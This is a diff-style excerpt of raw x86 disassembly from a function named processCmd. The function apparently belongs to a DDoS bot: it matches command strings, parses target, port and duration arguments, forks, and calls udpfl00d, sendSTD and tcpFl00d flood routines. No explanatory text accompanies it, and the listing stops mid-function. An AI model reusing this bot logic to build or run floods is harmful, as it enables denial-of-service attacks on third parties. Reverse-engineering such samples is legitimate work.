+ 804c4a6: e8 99 e8 ff ff               	calll	0x804ad44 <audprand3>
+ 804c4ab: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c4b2: e8 01 3d 00 00               	calll	0x80501b8 <_exit>
+ 804c4b7: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c4ba: 8b 00                        	movl	(%eax), %eax
+ 804c4bc: 89 85 c4 fd ff ff            	movl	%eax, -0x23c(%ebp)
+ 804c4c2: c7 85 c0 fd ff ff 07 8e 05 08	movl	$0x8058e07, -0x240(%ebp) # imm = 0x8058E07
+ 804c4cc: c7 85 bc fd ff ff 04 00 00 00	movl	$0x4, -0x244(%ebp)
+ 804c4d6: fc                           	cld
+ 804c4d7: 8b b5 c4 fd ff ff            	movl	-0x23c(%ebp), %esi
+ 804c4dd: 8b bd c0 fd ff ff            	movl	-0x240(%ebp), %edi
+ 804c4e3: 8b 8d bc fd ff ff            	movl	-0x244(%ebp), %ecx
+ 804c4e9: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804c4eb: 0f 97 c2                     	seta	%dl
+ 804c4ee: 0f 92 c0                     	setb	%al
+ 804c4f1: 88 d1                        	movb	%dl, %cl
+ 804c4f3: 28 c1                        	subb	%al, %cl
+ 804c4f5: 88 c8                        	movb	%cl, %al
+ 804c4f7: 0f be c0                     	movsbl	%al, %eax
+ 804c4fa: 85 c0                        	testl	%eax, %eax
+ 804c4fc: 0f 85 05 02 00 00            	jne	0x804c707 <processCmd+0x919>
+ 804c502: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804c506: 0f 8e bc 1c 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c50c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c50f: 83 c0 0c                     	addl	$0xc, %eax
+ 804c512: 8b 00                        	movl	(%eax), %eax
+ 804c514: 89 04 24                     	movl	%eax, (%esp)
+ 804c517: e8 c0 6e 00 00               	calll	0x80533dc <atol>
+ 804c51c: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804c51f: 0f 84 a3 1c 00 00            	je	0x804e1c8 <processCmd+0x23da>
+ 804c525: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c528: 83 c0 0c                     	addl	$0xc, %eax
+ 804c52b: 8b 00                        	movl	(%eax), %eax
+ 804c52d: 89 04 24                     	movl	%eax, (%esp)
+ 804c530: e8 a7 6e 00 00               	calll	0x80533dc <atol>
+ 804c535: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804c53a: 0f 8f 88 1c 00 00            	jg	0x804e1c8 <processCmd+0x23da>
+ 804c540: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c543: 83 c0 08                     	addl	$0x8, %eax
+ 804c546: 8b 00                        	movl	(%eax), %eax
+ 804c548: 89 04 24                     	movl	%eax, (%esp)
+ 804c54b: e8 8c 6e 00 00               	calll	0x80533dc <atol>
+ 804c550: 83 f8 ff                     	cmpl	$-0x1, %eax
+ 804c553: 75 05                        	jne	0x804c55a <processCmd+0x76c>
+ 804c555: e9 6e 1c 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c55a: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c55d: 83 c0 04                     	addl	$0x4, %eax
+ 804c560: 8b 00                        	movl	(%eax), %eax
+ 804c562: 89 85 74 fe ff ff            	movl	%eax, -0x18c(%ebp)
+ 804c568: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c56b: 83 c0 08                     	addl	$0x8, %eax
+ 804c56e: 8b 00                        	movl	(%eax), %eax
+ 804c570: 89 04 24                     	movl	%eax, (%esp)
+ 804c573: e8 64 6e 00 00               	calll	0x80533dc <atol>
+ 804c578: 89 85 78 fe ff ff            	movl	%eax, -0x188(%ebp)
+ 804c57e: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c581: 83 c0 0c                     	addl	$0xc, %eax
+ 804c584: 8b 00                        	movl	(%eax), %eax
+ 804c586: 89 04 24                     	movl	%eax, (%esp)
+ 804c589: e8 4e 6e 00 00               	calll	0x80533dc <atol>
+ 804c58e: 89 85 7c fe ff ff            	movl	%eax, -0x184(%ebp)
+ 804c594: c7 85 80 fe ff ff 20 00 00 00	movl	$0x20, -0x180(%ebp)
+ 804c59e: c7 85 84 fe ff ff 10 27 00 00	movl	$0x2710, -0x17c(%ebp)   # imm = 0x2710
+ 804c5a8: c7 85 88 fe ff ff 0a 00 00 00	movl	$0xa, -0x178(%ebp)
+ 804c5b2: c7 85 8c fe ff ff 40 42 0f 00	movl	$0xf4240, -0x174(%ebp)  # imm = 0xF4240
+ 804c5bc: c7 85 90 fe ff ff 00 00 00 00	movl	$0x0, -0x170(%ebp)
+ 804c5c6: 8b 85 74 fe ff ff            	movl	-0x18c(%ebp), %eax
+ 804c5cc: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804c5d4: 89 04 24                     	movl	%eax, (%esp)
+ 804c5d7: e8 84 4f 00 00               	calll	0x8051560 <strchr>
+ 804c5dc: 85 c0                        	testl	%eax, %eax
+ 804c5de: 0f 84 b6 00 00 00            	je	0x804c69a <processCmd+0x8ac>
+ 804c5e4: 8b 85 74 fe ff ff            	movl	-0x18c(%ebp), %eax
+ 804c5ea: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c5f2: 89 04 24                     	movl	%eax, (%esp)
+ 804c5f5: e8 ba 51 00 00               	calll	0x80517b4 <strtok>
+ 804c5fa: 89 85 94 fe ff ff            	movl	%eax, -0x16c(%ebp)
+ 804c600: e9 83 00 00 00               	jmp	0x804c688 <processCmd+0x89a>
+ 804c605: e8 4b d1 ff ff               	calll	0x8049755 <listFork>
+ 804c60a: 85 c0                        	testl	%eax, %eax
+ 804c60c: 75 60                        	jne	0x804c66e <processCmd+0x880>
+ 804c60e: 8b 85 90 fe ff ff            	movl	-0x170(%ebp), %eax
+ 804c614: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804c618: 8b 85 8c fe ff ff            	movl	-0x174(%ebp), %eax
+ 804c61e: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804c622: 8b 85 88 fe ff ff            	movl	-0x178(%ebp), %eax
+ 804c628: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804c62c: 8b 85 84 fe ff ff            	movl	-0x17c(%ebp), %eax
+ 804c632: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804c636: 8b 85 80 fe ff ff            	movl	-0x180(%ebp), %eax
+ 804c63c: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804c640: 8b 85 7c fe ff ff            	movl	-0x184(%ebp), %eax
+ 804c646: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c64a: 8b 85 78 fe ff ff            	movl	-0x188(%ebp), %eax
+ 804c650: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c654: 8b 85 94 fe ff ff            	movl	-0x16c(%ebp), %eax
+ 804c65a: 89 04 24                     	movl	%eax, (%esp)
+ 804c65d: e8 ff d3 ff ff               	calll	0x8049a61 <udpfl00d>
+ 804c662: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c669: e8 4a 3b 00 00               	calll	0x80501b8 <_exit>
+ 804c66e: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c676: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c67d: e8 32 51 00 00               	calll	0x80517b4 <strtok>
+ 804c682: 89 85 94 fe ff ff            	movl	%eax, -0x16c(%ebp)
+ 804c688: 83 bd 94 fe ff ff 00         	cmpl	$0x0, -0x16c(%ebp)
+ 804c68f: 0f 85 70 ff ff ff            	jne	0x804c605 <processCmd+0x817>
+ 804c695: e9 2e 1b 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c69a: e8 b6 d0 ff ff               	calll	0x8049755 <listFork>
+ 804c69f: 85 c0                        	testl	%eax, %eax
+ 804c6a1: 0f 85 21 1b 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804c6a7: 8b 85 90 fe ff ff            	movl	-0x170(%ebp), %eax
+ 804c6ad: 89 44 24 1c                  	movl	%eax, 0x1c(%esp)
+ 804c6b1: 8b 85 8c fe ff ff            	movl	-0x174(%ebp), %eax
+ 804c6b7: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804c6bb: 8b 85 88 fe ff ff            	movl	-0x178(%ebp), %eax
+ 804c6c1: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804c6c5: 8b 85 84 fe ff ff            	movl	-0x17c(%ebp), %eax
+ 804c6cb: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804c6cf: 8b 85 80 fe ff ff            	movl	-0x180(%ebp), %eax
+ 804c6d5: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804c6d9: 8b 85 7c fe ff ff            	movl	-0x184(%ebp), %eax
+ 804c6df: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c6e3: 8b 85 78 fe ff ff            	movl	-0x188(%ebp), %eax
+ 804c6e9: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c6ed: 8b 85 74 fe ff ff            	movl	-0x18c(%ebp), %eax
+ 804c6f3: 89 04 24                     	movl	%eax, (%esp)
+ 804c6f6: e8 66 d3 ff ff               	calll	0x8049a61 <udpfl00d>
+ 804c6fb: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c702: e8 b1 3a 00 00               	calll	0x80501b8 <_exit>
+ 804c707: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c70a: 8b 00                        	movl	(%eax), %eax
+ 804c70c: 89 85 b8 fd ff ff            	movl	%eax, -0x248(%ebp)
+ 804c712: c7 85 b4 fd ff ff 0b 8e 05 08	movl	$0x8058e0b, -0x24c(%ebp) # imm = 0x8058E0B
+ 804c71c: c7 85 b0 fd ff ff 04 00 00 00	movl	$0x4, -0x250(%ebp)
+ 804c726: fc                           	cld
+ 804c727: 8b b5 b8 fd ff ff            	movl	-0x248(%ebp), %esi
+ 804c72d: 8b bd b4 fd ff ff            	movl	-0x24c(%ebp), %edi
+ 804c733: 8b 8d b0 fd ff ff            	movl	-0x250(%ebp), %ecx
+ 804c739: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804c73b: 0f 97 c2                     	seta	%dl
+ 804c73e: 0f 92 c0                     	setb	%al
+ 804c741: 88 d1                        	movb	%dl, %cl
+ 804c743: 28 c1                        	subb	%al, %cl
+ 804c745: 88 c8                        	movb	%cl, %al
+ 804c747: 0f be c0                     	movsbl	%al, %eax
+ 804c74a: 85 c0                        	testl	%eax, %eax
+ 804c74c: 0f 85 5f 01 00 00            	jne	0x804c8b1 <processCmd+0xac3>
+ 804c752: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804c756: 0f 8e 6c 1a 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c75c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c75f: 83 c0 08                     	addl	$0x8, %eax
+ 804c762: 8b 00                        	movl	(%eax), %eax
+ 804c764: 89 04 24                     	movl	%eax, (%esp)
+ 804c767: e8 70 6c 00 00               	calll	0x80533dc <atol>
+ 804c76c: 85 c0                        	testl	%eax, %eax
+ 804c76e: 0f 8e 54 1a 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c774: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c777: 83 c0 0c                     	addl	$0xc, %eax
+ 804c77a: 8b 00                        	movl	(%eax), %eax
+ 804c77c: 89 04 24                     	movl	%eax, (%esp)
+ 804c77f: e8 58 6c 00 00               	calll	0x80533dc <atol>
+ 804c784: 85 c0                        	testl	%eax, %eax
+ 804c786: 0f 8e 3c 1a 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c78c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c78f: 83 c0 0c                     	addl	$0xc, %eax
+ 804c792: 8b 00                        	movl	(%eax), %eax
+ 804c794: 89 04 24                     	movl	%eax, (%esp)
+ 804c797: e8 40 6c 00 00               	calll	0x80533dc <atol>
+ 804c79c: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804c7a1: 7e 05                        	jle	0x804c7a8 <processCmd+0x9ba>
+ 804c7a3: e9 20 1a 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c7a8: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c7ab: 83 c0 04                     	addl	$0x4, %eax
+ 804c7ae: 8b 00                        	movl	(%eax), %eax
+ 804c7b0: 89 85 98 fe ff ff            	movl	%eax, -0x168(%ebp)
+ 804c7b6: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c7b9: 83 c0 08                     	addl	$0x8, %eax
+ 804c7bc: 8b 00                        	movl	(%eax), %eax
+ 804c7be: 89 04 24                     	movl	%eax, (%esp)
+ 804c7c1: e8 16 6c 00 00               	calll	0x80533dc <atol>
+ 804c7c6: 89 85 9c fe ff ff            	movl	%eax, -0x164(%ebp)
+ 804c7cc: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c7cf: 83 c0 0c                     	addl	$0xc, %eax
+ 804c7d2: 8b 00                        	movl	(%eax), %eax
+ 804c7d4: 89 04 24                     	movl	%eax, (%esp)
+ 804c7d7: e8 00 6c 00 00               	calll	0x80533dc <atol>
+ 804c7dc: 89 85 a0 fe ff ff            	movl	%eax, -0x160(%ebp)
+ 804c7e2: 8b 85 98 fe ff ff            	movl	-0x168(%ebp), %eax
+ 804c7e8: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804c7f0: 89 04 24                     	movl	%eax, (%esp)
+ 804c7f3: e8 68 4d 00 00               	calll	0x8051560 <strchr>
+ 804c7f8: 85 c0                        	testl	%eax, %eax
+ 804c7fa: 74 7a                        	je	0x804c876 <processCmd+0xa88>
+ 804c7fc: 8b 85 98 fe ff ff            	movl	-0x168(%ebp), %eax
+ 804c802: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c80a: 89 04 24                     	movl	%eax, (%esp)
+ 804c80d: e8 a2 4f 00 00               	calll	0x80517b4 <strtok>
+ 804c812: 89 85 a4 fe ff ff            	movl	%eax, -0x15c(%ebp)
+ 804c818: eb 51                        	jmp	0x804c86b <processCmd+0xa7d>
+ 804c81a: e8 36 cf ff ff               	calll	0x8049755 <listFork>
+ 804c81f: 85 c0                        	testl	%eax, %eax
+ 804c821: 75 2e                        	jne	0x804c851 <processCmd+0xa63>
+ 804c823: 8b 85 a0 fe ff ff            	movl	-0x160(%ebp), %eax
+ 804c829: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c82d: 8b 85 9c fe ff ff            	movl	-0x164(%ebp), %eax
+ 804c833: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c837: 8b 85 a4 fe ff ff            	movl	-0x15c(%ebp), %eax
+ 804c83d: 89 04 24                     	movl	%eax, (%esp)
+ 804c840: e8 15 e8 ff ff               	calll	0x804b05a <sendSTD>
+ 804c845: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c84c: e8 67 39 00 00               	calll	0x80501b8 <_exit>
+ 804c851: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804c859: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c860: e8 4f 4f 00 00               	calll	0x80517b4 <strtok>
+ 804c865: 89 85 a4 fe ff ff            	movl	%eax, -0x15c(%ebp)
+ 804c86b: 83 bd a4 fe ff ff 00         	cmpl	$0x0, -0x15c(%ebp)
+ 804c872: 75 a6                        	jne	0x804c81a <processCmd+0xa2c>
+ 804c874: eb 3b                        	jmp	0x804c8b1 <processCmd+0xac3>
+ 804c876: e8 da ce ff ff               	calll	0x8049755 <listFork>
+ 804c87b: 85 c0                        	testl	%eax, %eax
+ 804c87d: 0f 85 45 19 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804c883: 8b 85 a0 fe ff ff            	movl	-0x160(%ebp), %eax
+ 804c889: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804c88d: 8b 85 9c fe ff ff            	movl	-0x164(%ebp), %eax
+ 804c893: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804c897: 8b 85 98 fe ff ff            	movl	-0x168(%ebp), %eax
+ 804c89d: 89 04 24                     	movl	%eax, (%esp)
+ 804c8a0: e8 b5 e7 ff ff               	calll	0x804b05a <sendSTD>
+ 804c8a5: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804c8ac: e8 07 39 00 00               	calll	0x80501b8 <_exit>
+ 804c8b1: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c8b4: 8b 00                        	movl	(%eax), %eax
+ 804c8b6: 89 85 ac fd ff ff            	movl	%eax, -0x254(%ebp)
+ 804c8bc: c7 85 a8 fd ff ff 0f 8e 05 08	movl	$0x8058e0f, -0x258(%ebp) # imm = 0x8058E0F
+ 804c8c6: c7 85 a4 fd ff ff 05 00 00 00	movl	$0x5, -0x25c(%ebp)
+ 804c8d0: fc                           	cld
+ 804c8d1: 8b b5 ac fd ff ff            	movl	-0x254(%ebp), %esi
+ 804c8d7: 8b bd a8 fd ff ff            	movl	-0x258(%ebp), %edi
+ 804c8dd: 8b 8d a4 fd ff ff            	movl	-0x25c(%ebp), %ecx
+ 804c8e3: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804c8e5: 0f 97 c2                     	seta	%dl
+ 804c8e8: 0f 92 c0                     	setb	%al
+ 804c8eb: 88 d1                        	movb	%dl, %cl
+ 804c8ed: 28 c1                        	subb	%al, %cl
+ 804c8ef: 88 c8                        	movb	%cl, %al
+ 804c8f1: 0f be c0                     	movsbl	%al, %eax
+ 804c8f4: 85 c0                        	testl	%eax, %eax
+ 804c8f6: 0f 85 13 02 00 00            	jne	0x804cb0f <processCmd+0xd21>
+ 804c8fc: 83 7d 08 05                  	cmpl	$0x5, 0x8(%ebp)
+ 804c900: 0f 8e c2 18 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804c906: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c909: 83 c0 0c                     	addl	$0xc, %eax
+ 804c90c: 8b 00                        	movl	(%eax), %eax
+ 804c90e: 89 04 24                     	movl	%eax, (%esp)
+ 804c911: e8 c6 6a 00 00               	calll	0x80533dc <atol>
+ 804c916: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804c91b: 7e 05                        	jle	0x804c922 <processCmd+0xb34>
+ 804c91d: e9 a6 18 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804c922: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c925: 83 c0 04                     	addl	$0x4, %eax
+ 804c928: 8b 00                        	movl	(%eax), %eax
+ 804c92a: 89 85 a8 fe ff ff            	movl	%eax, -0x158(%ebp)
+ 804c930: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c933: 83 c0 08                     	addl	$0x8, %eax
+ 804c936: 8b 00                        	movl	(%eax), %eax
+ 804c938: 89 04 24                     	movl	%eax, (%esp)
+ 804c93b: e8 9c 6a 00 00               	calll	0x80533dc <atol>
+ 804c940: 89 85 ac fe ff ff            	movl	%eax, -0x154(%ebp)
+ 804c946: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c949: 83 c0 0c                     	addl	$0xc, %eax
+ 804c94c: 8b 00                        	movl	(%eax), %eax
+ 804c94e: 89 04 24                     	movl	%eax, (%esp)
+ 804c951: e8 86 6a 00 00               	calll	0x80533dc <atol>
+ 804c956: 89 85 b0 fe ff ff            	movl	%eax, -0x150(%ebp)
+ 804c95c: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c95f: 83 c0 10                     	addl	$0x10, %eax
+ 804c962: 8b 00                        	movl	(%eax), %eax
+ 804c964: 89 04 24                     	movl	%eax, (%esp)
+ 804c967: e8 70 6a 00 00               	calll	0x80533dc <atol>
+ 804c96c: 89 85 b4 fe ff ff            	movl	%eax, -0x14c(%ebp)
+ 804c972: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c975: 83 c0 14                     	addl	$0x14, %eax
+ 804c978: 8b 00                        	movl	(%eax), %eax
+ 804c97a: 89 85 b8 fe ff ff            	movl	%eax, -0x148(%ebp)
+ 804c980: 83 7d 08 06                  	cmpl	$0x6, 0x8(%ebp)
+ 804c984: 7e 18                        	jle	0x804c99e <processCmd+0xbb0>
+ 804c986: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c989: 83 c0 18                     	addl	$0x18, %eax
+ 804c98c: 8b 00                        	movl	(%eax), %eax
+ 804c98e: 89 04 24                     	movl	%eax, (%esp)
+ 804c991: e8 46 6a 00 00               	calll	0x80533dc <atol>
+ 804c996: 89 85 f8 fd ff ff            	movl	%eax, -0x208(%ebp)
+ 804c99c: eb 0a                        	jmp	0x804c9a8 <processCmd+0xbba>
+ 804c99e: c7 85 f8 fd ff ff 00 00 00 00	movl	$0x0, -0x208(%ebp)
+ 804c9a8: 8b b5 f8 fd ff ff            	movl	-0x208(%ebp), %esi
+ 804c9ae: 89 b5 bc fe ff ff            	movl	%esi, -0x144(%ebp)
+ 804c9b4: 83 7d 08 08                  	cmpl	$0x8, 0x8(%ebp)
+ 804c9b8: 75 18                        	jne	0x804c9d2 <processCmd+0xbe4>
+ 804c9ba: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804c9bd: 83 c0 1c                     	addl	$0x1c, %eax
+ 804c9c0: 8b 00                        	movl	(%eax), %eax
+ 804c9c2: 89 04 24                     	movl	%eax, (%esp)
+ 804c9c5: e8 12 6a 00 00               	calll	0x80533dc <atol>
+ 804c9ca: 89 85 fc fd ff ff            	movl	%eax, -0x204(%ebp)
+ 804c9d0: eb 0a                        	jmp	0x804c9dc <processCmd+0xbee>
+ 804c9d2: c7 85 fc fd ff ff 0a 00 00 00	movl	$0xa, -0x204(%ebp)
+ 804c9dc: 8b bd fc fd ff ff            	movl	-0x204(%ebp), %edi
+ 804c9e2: 89 bd c0 fe ff ff            	movl	%edi, -0x140(%ebp)
+ 804c9e8: 8b 85 a8 fe ff ff            	movl	-0x158(%ebp), %eax
+ 804c9ee: c7 44 24 04 2c 00 00 00      	movl	$0x2c, 0x4(%esp)
+ 804c9f6: 89 04 24                     	movl	%eax, (%esp)
+ 804c9f9: e8 62 4b 00 00               	calll	0x8051560 <strchr>
+ 804c9fe: 85 c0                        	testl	%eax, %eax
+ 804ca00: 0f 84 a6 00 00 00            	je	0x804caac <processCmd+0xcbe>
+ 804ca06: 8b 85 a8 fe ff ff            	movl	-0x158(%ebp), %eax
+ 804ca0c: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804ca14: 89 04 24                     	movl	%eax, (%esp)
+ 804ca17: e8 98 4d 00 00               	calll	0x80517b4 <strtok>
+ 804ca1c: 89 85 c4 fe ff ff            	movl	%eax, -0x13c(%ebp)
+ 804ca22: eb 79                        	jmp	0x804ca9d <processCmd+0xcaf>
+ 804ca24: e8 2c cd ff ff               	calll	0x8049755 <listFork>
+ 804ca29: 85 c0                        	testl	%eax, %eax
+ 804ca2b: 75 56                        	jne	0x804ca83 <processCmd+0xc95>
+ 804ca2d: 8b 85 c0 fe ff ff            	movl	-0x140(%ebp), %eax
+ 804ca33: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804ca37: 8b 85 bc fe ff ff            	movl	-0x144(%ebp), %eax
+ 804ca3d: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804ca41: 8b 85 b8 fe ff ff            	movl	-0x148(%ebp), %eax
+ 804ca47: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804ca4b: 8b 85 b4 fe ff ff            	movl	-0x14c(%ebp), %eax
+ 804ca51: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804ca55: 8b 85 b0 fe ff ff            	movl	-0x150(%ebp), %eax
+ 804ca5b: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804ca5f: 8b 85 ac fe ff ff            	movl	-0x154(%ebp), %eax
+ 804ca65: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804ca69: 8b 85 c4 fe ff ff            	movl	-0x13c(%ebp), %eax
+ 804ca6f: 89 04 24                     	movl	%eax, (%esp)
+ 804ca72: e8 a6 d4 ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804ca77: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804ca7e: e8 35 37 00 00               	calll	0x80501b8 <_exit>
+ 804ca83: c7 44 24 04 04 82 05 08      	movl	$0x8058204, 0x4(%esp)   # imm = 0x8058204
+ 804ca8b: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804ca92: e8 1d 4d 00 00               	calll	0x80517b4 <strtok>
+ 804ca97: 89 85 c4 fe ff ff            	movl	%eax, -0x13c(%ebp)
+ 804ca9d: 83 bd c4 fe ff ff 00         	cmpl	$0x0, -0x13c(%ebp)
+ 804caa4: 0f 85 7a ff ff ff            	jne	0x804ca24 <processCmd+0xc36>
+ 804caaa: eb 63                        	jmp	0x804cb0f <processCmd+0xd21>
+ 804caac: e8 a4 cc ff ff               	calll	0x8049755 <listFork>
+ 804cab1: 85 c0                        	testl	%eax, %eax
+ 804cab3: 0f 85 0f 17 00 00            	jne	0x804e1c8 <processCmd+0x23da>
+ 804cab9: 8b 85 c0 fe ff ff            	movl	-0x140(%ebp), %eax
+ 804cabf: 89 44 24 18                  	movl	%eax, 0x18(%esp)
+ 804cac3: 8b 85 bc fe ff ff            	movl	-0x144(%ebp), %eax
+ 804cac9: 89 44 24 14                  	movl	%eax, 0x14(%esp)
+ 804cacd: 8b 85 b8 fe ff ff            	movl	-0x148(%ebp), %eax
+ 804cad3: 89 44 24 10                  	movl	%eax, 0x10(%esp)
+ 804cad7: 8b 85 b4 fe ff ff            	movl	-0x14c(%ebp), %eax
+ 804cadd: 89 44 24 0c                  	movl	%eax, 0xc(%esp)
+ 804cae1: 8b 85 b0 fe ff ff            	movl	-0x150(%ebp), %eax
+ 804cae7: 89 44 24 08                  	movl	%eax, 0x8(%esp)
+ 804caeb: 8b 85 ac fe ff ff            	movl	-0x154(%ebp), %eax
+ 804caf1: 89 44 24 04                  	movl	%eax, 0x4(%esp)
+ 804caf5: 8b 85 a8 fe ff ff            	movl	-0x158(%ebp), %eax
+ 804cafb: 89 04 24                     	movl	%eax, (%esp)
+ 804cafe: e8 1a d4 ff ff               	calll	0x8049f1d <tcpFl00d>
+ 804cb03: c7 04 24 00 00 00 00         	movl	$0x0, (%esp)
+ 804cb0a: e8 a9 36 00 00               	calll	0x80501b8 <_exit>
+ 804cb0f: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cb12: 8b 00                        	movl	(%eax), %eax
+ 804cb14: 89 85 a0 fd ff ff            	movl	%eax, -0x260(%ebp)
+ 804cb1a: c7 85 9c fd ff ff 14 8e 05 08	movl	$0x8058e14, -0x264(%ebp) # imm = 0x8058E14
+ 804cb24: c7 85 98 fd ff ff 04 00 00 00	movl	$0x4, -0x268(%ebp)
+ 804cb2e: fc                           	cld
+ 804cb2f: 8b b5 a0 fd ff ff            	movl	-0x260(%ebp), %esi
+ 804cb35: 8b bd 9c fd ff ff            	movl	-0x264(%ebp), %edi
+ 804cb3b: 8b 8d 98 fd ff ff            	movl	-0x268(%ebp), %ecx
+ 804cb41: f3 a6                        	rep		cmpsb	%es:(%edi), (%esi)
+ 804cb43: 0f 97 c2                     	seta	%dl
+ 804cb46: 0f 92 c0                     	setb	%al
+ 804cb49: 88 d1                        	movb	%dl, %cl
+ 804cb4b: 28 c1                        	subb	%al, %cl
+ 804cb4d: 88 c8                        	movb	%cl, %al
+ 804cb4f: 0f be c0                     	movsbl	%al, %eax
+ 804cb52: 85 c0                        	testl	%eax, %eax
+ 804cb54: 0f 85 af 01 00 00            	jne	0x804cd09 <processCmd+0xf1b>
+ 804cb5a: 83 7d 08 03                  	cmpl	$0x3, 0x8(%ebp)
+ 804cb5e: 0f 8e 64 16 00 00            	jle	0x804e1c8 <processCmd+0x23da>
+ 804cb64: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cb67: 83 c0 0c                     	addl	$0xc, %eax
+ 804cb6a: 8b 00                        	movl	(%eax), %eax
+ 804cb6c: 89 04 24                     	movl	%eax, (%esp)
+ 804cb6f: e8 68 68 00 00               	calll	0x80533dc <atol>
+ 804cb74: 3d 10 27 00 00               	cmpl	$0x2710, %eax           # imm = 0x2710
+ 804cb79: 7e 05                        	jle	0x804cb80 <processCmd+0xd92>
+ 804cb7b: e9 48 16 00 00               	jmp	0x804e1c8 <processCmd+0x23da>
+ 804cb80: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cb83: 83 c0 04                     	addl	$0x4, %eax
+ 804cb86: 8b 00                        	movl	(%eax), %eax
+ 804cb88: 89 85 c8 fe ff ff            	movl	%eax, -0x138(%ebp)
+ 804cb8e: 8b 45 0c                     	movl	0xc(%ebp), %eax
+ 804cb91: 83 c0 08                     	addl	$0x8, %eax
+ 804cb94: 8b 00                        	movl	(%eax), %eax
+ 804cb96: 89 04 24                     	movl	%eax, (%esp)
+ 804cb99: e8 3e 68 00 00               	calll	0x80533dc <atol>
